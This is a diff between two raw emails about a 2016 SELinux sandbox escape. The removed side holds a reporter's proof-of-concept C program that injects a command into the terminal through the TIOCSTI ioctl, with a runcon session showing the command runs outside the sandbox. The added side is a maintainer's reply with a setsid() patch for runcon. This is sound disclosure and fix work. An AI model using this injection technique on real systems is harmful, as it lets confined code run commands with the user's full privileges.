@@ -1,53 +1,57 @@
-Message-ID: <20160924115740.18196b6yz71zn4kc@webmail.alunos.dcc.fc.up.pt>
-Date: Sat, 24 Sep 2016 11:57:40 +0200
-From: up201407890@alunos.dcc.fc.up.pt
-To: "Stephen Smalley" <sds@tycho.nsa.gov>
-Cc: selinux@tycho.nsa.gov, "Paul Moore" <paul@paul-moore.com>
-Subject: Re: SELinux sandbox escape via TIOCSTI ioctl
-References: <20160923112350.89325hv7y899lack@webmail.alunos.dcc.fc.up.pt>
- <e6efcd0b-27cd-de33-d111-bc2bcb1dc0b1@tycho.nsa.gov>
-In-Reply-To: <e6efcd0b-27cd-de33-d111-bc2bcb1dc0b1@tycho.nsa.gov>
+Subject: Re: bug#24541: runcon tty hijacking via TIOCSTI ioctl
+To: up201407890@alunos.dcc.fc.up.pt, 24541@debbugs.gnu.org,
+ SE-Linux <SELinux@tycho.nsa.gov>
+References: <20160925133955.72163x0kftak7yqs@webmail.alunos.dcc.fc.up.pt>
+From: Paul Eggert <eggert@cs.ucla.edu>
+Message-ID: <ad807471-3549-b9fa-e718-8110e6a768b2@cs.ucla.edu>
+Date: Sun, 25 Sep 2016 11:49:40 -0700
 MIME-Version: 1.0
-Content-Type: text/plain;
-	charset=UTF-8;
-	DelSp="Yes";
-	format="flowed"
+In-Reply-To: <20160925133955.72163x0kftak7yqs@webmail.alunos.dcc.fc.up.pt>
+Content-Type: multipart/mixed; boundary="------------0E4B4496D9029FEB435C050E"
 List-Id: "Security-Enhanced Linux \(SELinux\) mailing list"
  <selinux.tycho.nsa.gov>
 List-Post: <mailto:selinux@tycho.nsa.gov>
 List-Help: <mailto:selinux-request@tycho.nsa.gov?subject=help>
 
-Quoting "Stephen Smalley" <sds@tycho.nsa.gov>:
+This is a multi-part message in MIME format.
+--------------0E4B4496D9029FEB435C050E
+Content-Type: text/plain; charset=utf-8; format=flowed
+Content-Transfer-Encoding: quoted-printable
 
-> Thank you for the bug report. This bug is now fixed in upstream commit
-> acca96a135a4d2a028ba9b636886af99c0915379.
+up201407890@alunos.dcc.fc.up.pt wrote re <http://bugs.gnu.org/24541>:
+> When executing a program via the runcon utility, the nonpriv session
+> can escape to the parent session by using the TIOCSTI ioctl to push
+> characters into the terminal's input buffer, allowing an attacker to
+> execute arbitrary commands without the SELinux security context.
 
-Cool, thanks. Though it'll lose job control, that's why most 'su-like'  
-programs refuse to patch this and are still vulnerable.
+Thanks for the bug report. Surely this is a bug in the setexeccon system =
+call,=20
+not in the runcon command that uses the system call. That being said, per=
+haps=20
+runcon should work around the bug via something like the attached patch.
 
-Anyways, the same happens with the 'runcon' utility:
+--------------0E4B4496D9029FEB435C050E
+Content-Type: text/x-diff;
+ name="runcon.diff"
+Content-Transfer-Encoding: quoted-printable
+Content-Disposition: attachment;
+ filename="runcon.diff"
 
-$ cat test.c
-#include <unistd.h>
-#include <sys/ioctl.h>
+diff --git a/src/runcon.c b/src/runcon.c
+index b25db04..52b0b36 100644
+--- a/src/runcon.c
++++ b/src/runcon.c
+@@ -249,6 +249,11 @@ main (int argc, char **argv)
+     error (EXIT_FAILURE, errno, _("invalid context: %s"),
+            quote (context_str (con)));
+=20
++  /* Prevent the sandboxed process from using the TIOCSTI ioctl to
++     push characters into the controlling terminal's input buffer.  */
++  if (setsid () !=3D 0)
++    error (EXIT_FAILURE, errno, _("cannot create session"));
++
+   if (setexeccon (context_str (con)) !=3D 0)
+     error (EXIT_FAILURE, errno, _("unable to set security context %s"),
+            quote (context_str (con)));
 
-int main()
-{
-   char *cmd = "id\n";
-   while(*cmd)
-    ioctl(0, TIOCSTI, cmd++);
-   execlp("/bin/id", "id", NULL);
-}
-$ gcc test.c -o test
-$ runcon -t sandbox_t ./test
-id
-uid=1000 gid=1000 groups=1000  
-context=unconfined_u:unconfined_r:sandbox_t:s0-s0:c0.c1023
-$ id
-uid=1000(saken) gid=1000(saken) groups=1000(saken)  
-context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
-
-Should it be also patched there?
-
-----------------------------------------------------------------
-This message was sent using IMP, the Internet Messaging Program.
+--------------0E4B4496D9029FEB435C050E--
